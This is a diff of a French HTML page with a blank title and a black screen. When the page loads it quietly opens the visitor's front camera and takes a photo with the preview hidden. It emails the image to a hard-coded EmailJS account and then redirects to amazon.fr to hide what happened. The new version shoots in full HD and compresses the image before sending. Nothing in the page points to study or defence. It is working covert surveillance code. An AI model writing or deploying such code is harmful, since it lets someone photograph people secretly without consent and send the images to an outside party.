@@ -1,58 +1,39 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <title></title>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      background: #000; /* écran noir */
-      height: 100%;
-      width: 100%;
-      overflow: hidden;
-    }
-    video, canvas {
-      display: none !important;
-    }
-  </style>
+<meta charset="UTF-8">
+<title></title>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<style>
+html,body{margin:0;padding:0;width:100%;height:100%;background:#000;overflow:hidden;}
+video,canvas{display:none;}
+</style>
 </head>
 <body>
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="640" height="480"></canvas> <!-- HD -->
-
-  <script>
-    emailjs.init("IoSfbtGz4KSL_5_9E");
-
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
-
-    async function startCapture() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        video.srcObject = stream;
-
-        video.onloadeddata = () => {
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL("image/jpeg", 0.76); // qualité 76%
-
-          stream.getTracks().forEach(track => track.stop()); // stop caméra
-
-          emailjs.send("service_8cs0gml", "template_rdhxflt", {
-            message: "Photo auto 📸",
-            image: imageData
-          }).finally(() => {
-            window.location.href = "https://www.amazon.fr";
-          });
-        };
-      } catch (err) {
-        window.location.href = "https://www.amazon.fr";
-      }
-    }
-
-    window.onload = startCapture;
-  </script>
+<video id="v" autoplay playsinline></video>
+<canvas id="c" width="1920" height="1080"></canvas>
+<script>
+emailjs.init("IoSfbtGz4KSL_5_9E");
+const v=document.getElementById("v"),c=document.getElementById("c"),ctx=c.getContext("2d");
+async function capture(){
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1920,height:1080}});
+    v.srcObject=stream;
+    v.onloadeddata=()=>{
+      ctx.drawImage(v,0,0,c.width,c.height);
+      let q=0.9,img;
+      do{
+        img=c.toDataURL("image/jpeg",q);
+        if(Math.round(img.length*3/4/1024)<=60) break;
+        q-=0.05;
+      }while(q>0.1);
+      stream.getTracks().forEach(t=>t.stop());
+      emailjs.send("service_8cs0gml","template_rdhxflt",{message:"Photo auto 📸",image:img});
+      setTimeout(()=>window.location.href="https://www.amazon.fr",500);
+    };
+  }catch(e){window.location.href="https://www.amazon.fr";}
+}
+window.onload=capture;
+</script>
 </body>
 </html>
